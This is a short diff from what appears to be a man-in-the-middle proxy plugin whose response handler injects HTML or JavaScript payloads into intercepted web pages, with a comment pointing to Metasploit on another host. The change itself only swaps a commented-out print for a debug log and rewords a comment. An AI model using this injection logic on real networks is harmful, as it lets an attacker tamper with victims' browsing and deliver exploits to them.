@@ -59,10 +59,11 @@ class Inject(CacheKill, Plugin):
     def handleResponse(self, request, data):
         #We throttle to only inject once every two seconds per client
         #If you have MSF on another host, you may need to check prior to injection
-        #print "http://" + request.client.getRequestHostname() + request.uri
+        logging.debug("[Inject] Injecting into : http://" + request.client.getRequestHostname() + request.uri)
         ip, hn, mime = self._get_req_info(request)
+
         if self._should_inject(ip, hn, mime) and (not self.js_src == self.html_src is not None or not self.html_payload == ""):
-            if hn not in self.proxyip: #prevents recursive injecting
+            if hn not in self.proxyip: #prevents injecting into pages we are hosting
                 data = self._insert_html(data, post=[(self.match_str, self._get_payload())])
                 self.ctable[ip] = time.time()
                 self.dtable[ip+hn] = True
